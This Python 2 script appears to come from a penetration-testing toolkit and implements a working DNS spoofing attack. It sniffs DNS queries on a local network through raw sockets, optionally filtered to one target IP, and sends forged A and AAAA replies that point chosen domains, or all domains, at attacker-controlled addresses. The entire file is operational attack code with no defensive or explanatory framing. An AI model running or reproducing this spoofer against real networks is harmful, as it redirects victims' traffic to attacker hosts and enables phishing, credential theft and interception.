#!/usr/bin/env python

# region Import
from sys import path
from os.path import dirname, abspath
project_root_path = dirname(dirname(abspath(__file__)))
utils_path = project_root_path + "/Utils/"
path.append(utils_path)

from base import Base
from network import Ethernet_raw, ARP_raw, IP_raw, UDP_raw, DNS_raw
from ipaddress import IPv4Address
from argparse import ArgumentParser
from socket import socket, AF_PACKET, SOCK_RAW, getaddrinfo, AF_INET, AF_INET6, gaierror, htons
# endregion

# region Check user and platform
Base = Base()
Base.check_user()
Base.check_platform()
# endregion

# region Parse script arguments
parser = ArgumentParser(description='DNS server')

parser.add_argument('-i', '--interface', help='Set interface name for send DNS reply packets', default=None)
parser.add_argument('-t', '--target_ip', help='Set target IP address', default=None)

parser.add_argument('--fake_domains', help='Set fake domain or domains, example: --fake_domains "apple.com,google.com"',
                    default=None)
parser.add_argument('--fake_ip', help='Set fake IP address or addresses, example: --fake_ip "192.168.0.1,192.168.0.2"',
                    default=None)
parser.add_argument('--fake_ipv6', help='Set fake IPv6 address or addresses, example: --fake_ipv6 "fd00::1,fd00::2"',
                    default=None)

parser.add_argument('--ipv6', action='store_true', help='Enable IPv6')
parser.add_argument('-f', '--fake_answer', action='store_true', help='Set your IPv4 or IPv6 address in all answers')
parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')

args = parser.parse_args()
# endregion

# region Print banner if argument quit is not set
if not args.quiet:
    Base.print_banner()
# endregion

# region Set global variables

eth = Ethernet_raw()
arp = ARP_raw()
ip = IP_raw()
udp = UDP_raw()
dns = DNS_raw()

target_ip_address = None

fake_domains = []
fake_ip_addresses = []
fake_ipv6_addresses = []
fake_addresses = {}

A_DNS_QUERY = 1
AAAA_DNS_QUERY = 28

if args.ipv6:
    DNS_QUERY_TYPES = [1, 28]
else:
    DNS_QUERY_TYPES = [1]

# endregion

# region Get your network settings
if args.interface is None:
    Base.print_warning("Please set a network interface for sniffing DNS queries ...")
current_network_interface = Base.netiface_selection(args.interface)

your_mac_address = Base.get_netiface_mac_address(current_network_interface)
if your_mac_address is None:
    Base.print_error("Network interface: ", current_network_interface, " do not have MAC address!")
    exit(1)

your_ip_address = Base.get_netiface_ip_address(current_network_interface)
if your_ip_address is None:
    Base.print_error("Network interface: ", current_network_interface, " do not have IP address!")
    exit(1)

if args.ipv6:
    your_ipv6_addresses = Base.get_netiface_ipv6_glob_addresses(current_network_interface)
    if len(your_ipv6_addresses) == 0:
        if not args.quiet:
            Base.print_warning("Network interface: ", current_network_interface, " do not have global IPv6 address!")
        fake_addresses[28] = None
    else:
        fake_addresses[28] = your_ipv6_addresses
else:
    fake_addresses[28] = None

fake_addresses[1] = [your_ip_address]
# endregion

# region Create fake domains list
if args.fake_domains is not None:

    # Delete spaces
    fake_domains_string = args.fake_domains.replace(" ", "")

    # Create list
    for domain_name in fake_domains_string.split(","):
        fake_domains.append(domain_name)
# endregion

# region Create fake ipv4 addresses list
if args.fake_ip is not None:

    # Delete spaces
    fake_ip_string = args.fake_ip.replace(" ", "")

    # Create list
    for ip_address in fake_ip_string.split(","):
        if Base.ip_address_validation(ip_address):
            fake_ip_addresses.append(ip_address)
        else:
            Base.print_error("Illegal IPv4 address: ", ip_address)
            exit(1)

    # Set fake IPv4 addresses dictionary
    fake_addresses[1] = fake_ip_addresses

# endregion

# region Create fake ipv6 addresses list
if args.fake_ipv6 is not None:

    # Delete spaces
    fake_ipv6_string = args.fake_ipv6.replace(" ", "")

    # Create list
    for ipv6_address in fake_ipv6_string.split(","):
        if Base.ipv6_address_validation(ipv6_address):
            fake_ipv6_addresses.append(ipv6_address)
        else:
            Base.print_error("Illegal IPv6 address: ", ipv6_address)
            exit(1)

    # Set fake IPv6 addresses dictionary
    fake_addresses[28] = fake_ipv6_addresses

    # Rewrite available DNS query types
    DNS_QUERY_TYPES = [1, 28]

# endregion

# region Create raw socket
SOCK = socket(AF_PACKET, SOCK_RAW)
SOCK.bind((current_network_interface, 0))
# endregion

# region Get first and last IP address in your network
first_ip_address = str(IPv4Address(unicode(Base.get_netiface_first_ip(current_network_interface))) - 1)
last_ip_address = str(IPv4Address(unicode(Base.get_netiface_last_ip(current_network_interface))) + 1)
# endregion

# region Check target IP
if args.target_ip is not None:
    if not Base.ip_address_in_range(args.target_ip, first_ip_address, last_ip_address):
        Base.print_error("Bad value `-t, --target_ip`: ", args.target_ip,
                         "; target IP address must be in range: ", first_ip_address + " - " + last_ip_address)
        exit(1)
    else:
        target_ip_address = args.target_ip
# endregion


# region Get first IPv4 or IPv6 address of domain
def get_domain_address(query_name, query_type=1):

    # Set proto
    if query_type == 28:
        proto = AF_INET6
    else:
        proto = AF_INET

    try:
        # Get list of addresses
        addresses = getaddrinfo(query_name, None, proto)

        # Return first address from list
        return [addresses[0][4][0]]

    except gaierror:

        # Could not resolve name
        return None

# endregion


# region DNS reply function
def reply(request):

    # region Define global variables
    global SOCK
    global dns
    global args
    global fake_domains
    global fake_addresses
    global DNS_QUERY_TYPES
    # endregion

    # region This request is DNS query
    if 'DNS' in request.keys():

        for request_query in request['DNS']['queries']:

            # region Get DNS query type
            query_type = request_query['type']
            # endregion

            # region Type of DNS query type: A or AAAA
            if query_type in DNS_QUERY_TYPES:

                try:

                    # region Local variables
                    query_class = request_query['class']
                    answer = []
                    addresses = None
                    # endregion

                    # region Create query list
                    if request_query['name'].endswith("."):
                        query_name = request_query['name'][:-1]
                    else:
                        query_name = request_query['name']

                    query = [{
                        "type": query_type,
                        "class": query_class,
                        "name": query_name
                    }]
                    # endregion

                    # region Script arguments condition check

                    # region Argument fake_answer is set
                    if args.fake_answer:
                        addresses = fake_addresses[query_type]
                    # endregion

                    # region Argument fake_answer is NOT set
                    else:

                        # region Fake domains list is set
                        if len(fake_domains) > 0:

                            # region Fake domains list is set and DNS query name in fake domains list
                            if query_name in fake_domains:

                                # region A DNS query
                                if query_type == 1:

                                    # Fake IPv4 is set
                                    if args.fake_ip is not None:
                                        addresses = fake_addresses[query_type]

                                    # Fake IPv4 is NOT set
                                    else:
                                        addresses = get_domain_address(query_name, query_type)

                                # endregion

                                # region AAAA DNS query
                                if query_type == 28:

                                    # Fake IPv6 is set
                                    if args.fake_ipv6 is not None:
                                        addresses = fake_addresses[query_type]

                                    # Fake IPv6 is NOT set
                                    else:
                                        addresses = get_domain_address(query_name, query_type)

                                # endregion

                            # endregion

                            # region Fake domains list is set and DNS query name NOT in fake domains list
                            else:
                                addresses = get_domain_address(query_name, query_type)
                            # endregion

                        # endregion

                        # region Fake domains list is NOT set
                        else:

                            # region A DNS query
                            if query_type == 1:

                                # Fake IPv4 is set
                                if args.fake_ip is not None:
                                    addresses = fake_addresses[query_type]

                                # Fake IPv4 is NOT set
                                else:
                                    addresses = get_domain_address(query_name, query_type)

                            # endregion

                            # region AAAA DNS query
                            if query_type == 28:

                                # Fake IPv6 is set
                                if args.fake_ipv6 is not None:
                                    addresses = fake_addresses[query_type]

                                # Fake IPv6 is NOT set
                                else:
                                    addresses = get_domain_address(query_name, query_type)

                            # endregion

                        # endregion

                    # endregion

                    # endregion

                    # region Answer addresses is set

                    if addresses is not None:

                        # region Create answer list
                        for address in addresses:
                            answer.append({"name": query_name,
                                           "type": query_type,
                                           "class": query_class,
                                           "ttl": 0xffff,
                                           "address": address})
                        # endregion

                        # region Make dns answer packet
                        dns_answer_packet = dns.make_response_packet(src_mac=request['Ethernet']['destination'],
                                                                     dst_mac=request['Ethernet']['source'],
                                                                     src_ip=request['IP']['destination-ip'],
                                                                     dst_ip=request['IP']['source-ip'],
                                                                     src_port=53,
                                                                     dst_port=request['UDP']['source-port'],
                                                                     tid=request['DNS']['transaction-id'],
                                                                     flags=0x8580,
                                                                     queries=query,
                                                                     answers_address=answer)
                        # endregion

                        # region Send DNS answer packet
                        SOCK.send(dns_answer_packet)
                        # endregion

                        # region Print info message
                        if query_type == 1:
                            Base.print_info("DNS query from: ", request['IP']['source-ip'],
                                            " to ", request['IP']['destination-ip'], " type: ", "A",
                                            " domain: ", query_name, " answer: ", (", ".join(addresses)))
                        if query_type == 28:
                            Base.print_info("DNS query from: ", request['IP']['source-ip'],
                                            " to ", request['IP']['destination-ip'], " type: ", "AAAA",
                                            " domain: ", query_name, " answer: ", (", ".join(addresses)))
                        # endregion

                    # endregion

                except:
                    pass
            # endregion

    # endregion

# endregion


# region Main function
if __name__ == "__main__":

    # region Script arguments condition check and print info message
    if not args.quiet:

        # region Argument fake_answer is set
        if args.fake_answer:
            Base.print_info("DNS answer fake IPv4 address: ", (", ".join(fake_addresses[1])), " for all DNS queries")

            if fake_addresses[28] is not None:
                Base.print_info("DNS answer fake IPv6 address: ", (", ".join(fake_addresses[28])), " for all DNS queries")

        # endregion

        # region Argument fake_answer is NOT set
        else:

            # region Fake domains list is set
            if len(fake_domains) > 0:

                if args.fake_ip is not None:
                    Base.print_info("DNS answer fake IPv4 address: ", (", ".join(fake_addresses[1])),
                                    " for domain: ", (", ".join(fake_domains)))

                if args.fake_ipv6 is not None:
                    Base.print_info("DNS answer fake IPv6 address: ", (", ".join(fake_addresses[28])),
                                    " for domain: ", (", ".join(fake_domains)))

            # endregion

            # region Fake domains list is NOT set
            else:

                if args.fake_ip is not None:
                    Base.print_info("DNS answer fake IPv4 address: ", (", ".join(fake_addresses[1])),
                                    " for all DNS queries")

                if args.fake_ipv6 is not None:
                    Base.print_info("DNS answer fake IPv6 address: ", (", ".join(fake_addresses[28])),
                                    " for all DNS queries")

            # endregion

        # endregion

    # endregion

    # region Sniff network

    # region Create RAW socket for sniffing
    rawSocket = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
    # endregion

    # region Local variables
    ethernet_header_length = 14
    udp_header_length = 8
    # endregion

    # region Print info message
    Base.print_info("Waiting for a DNS requests ...")
    # endregion

    # region Start sniffing
    while True:

        try:

            # region Get packets from RAW socket
            packets = rawSocket.recvfrom(2048)

            for packet in packets:

                # region Get Ethernet header from packet
                ethernet_header = packet[0:ethernet_header_length]
                ethernet_header_dict = eth.parse_header(ethernet_header)
                # endregion

                # region Success parse Ethernet header
                if ethernet_header_dict is not None:

                    # region DNS packet

                    # region Filter your Ethernet packets
                    if ethernet_header_dict['source'] == your_mac_address:
                        break
                    # endregion

                    # 2048 - Type of IP packet (0x0800)
                    if ethernet_header_dict['type'] == 2048:

                        # Get IP header
                        ip_header = packet[ethernet_header_length:]
                        ip_header_dict = ip.parse_header(ip_header)

                        # Success parse IP header
                        if ip_header_dict is not None:

                            # region Target IP address is Set
                            if target_ip_address is not None:
                                if ip_header_dict['source-ip'] != target_ip_address:
                                    break
                            # endregion

                            # UDP
                            if ip_header_dict['protocol'] == 17:

                                # Get UDP header offset
                                udp_header_offset = ethernet_header_length + (ip_header_dict['length'] * 4)

                                # Get UDP header
                                udp_header = packet[udp_header_offset:udp_header_offset + udp_header_length]
                                udp_header_dict = udp.parse_header(udp_header)

                                # Success parse UDP header
                                if udp_header is not None:
                                    if udp_header_dict['destination-port'] == 53:

                                        # Get DHCP header offset
                                        dns_packet_offset = udp_header_offset + udp_header_length

                                        # Get DHCP packet
                                        dns_packet = packet[dns_packet_offset:]
                                        dns_packet_dict = dns.parse_request_packet(dns_packet)

                                        # Create full request
                                        request = {
                                            "Ethernet": ethernet_header_dict,
                                            "IP": ip_header_dict,
                                            "UDP": udp_header_dict,
                                            "DNS": dns_packet_dict
                                        }

                                        # Reply to this request
                                        reply(request)

                    # endregion

                # endregion

            # endregion

        except KeyboardInterrupt:
            Base.print_info("Exit")
            exit(0)

    # endregion

    # endregion

# endregion
